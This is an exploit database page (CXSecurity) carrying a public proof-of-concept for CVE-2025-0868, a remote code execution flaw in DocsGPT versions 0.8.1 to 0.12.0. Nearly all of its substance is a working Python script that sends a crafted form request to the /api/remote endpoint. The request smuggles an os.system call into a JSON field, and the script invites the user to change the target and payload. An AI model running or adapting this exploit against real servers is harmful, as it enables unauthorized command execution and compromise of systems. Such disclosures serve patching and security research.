---
title: DocsGPT 0.12.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025040016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-10
fetch_date: 2025-10-06T22:04:14.954430
---

# DocsGPT 0.12.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **DocsGPT 0.12.0 Remote Code Execution** **2025.04.09**  Credit:  **[Shreyas Malhotra](https://cxsecurity.com/author/Shreyas%2BMalhotra/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-0868](https://cxsecurity.com/cveshow/CVE-2025-0868/ "Click to see CVE-2025-0868")**  CWE: **N/A** | |

# Exploit Title: DocsGPT 0.12.0 - Remote Code Execution
# Date: 09/04/2025
# Exploit Author: Shreyas Malhotra (OSMSEC)
# Vendor Homepage: https://github.com/arc53/docsgpt
# Software Link: https://github.com/arc53/DocsGPT/archive/refs/tags/0.12.0.zip
# Version: 0.8.1 through 0.12.0
# Tested on: Debian Linux/Ubuntu Linux/Kali Linux
# CVE: CVE-2025-0868
import requests
# TARGET CONFIG
TARGET = "http://10.0.2.15:7091" # Change this
# Malicious payload string - carefully escaped - modify the python code if necessary
malicious\_data = (
'user=1&source=reddit&name=other&data={"source":"reddit",'
'"client\_id":"1111","client\_secret":1111,"user\_agent":"111",'
'"search\_queries":[""],"number\_posts":10,'
'"rce\\\\":\_\_import\_\_(\'os\').system(\'touch /tmp/test\')}#":11}'
)
headers = {
"Content-Type": "application/x-www-form-urlencoded"
}
try:
response = requests.post(f"{TARGET}/api/remote", headers=headers, data=malicious\_data)
print(f"[+] Status Code: {response.status\_code}")
print("[+] Response Body:")
print(response.text)
except Exception as e:
print(f"[-] Error sending request: {e}")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040016)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top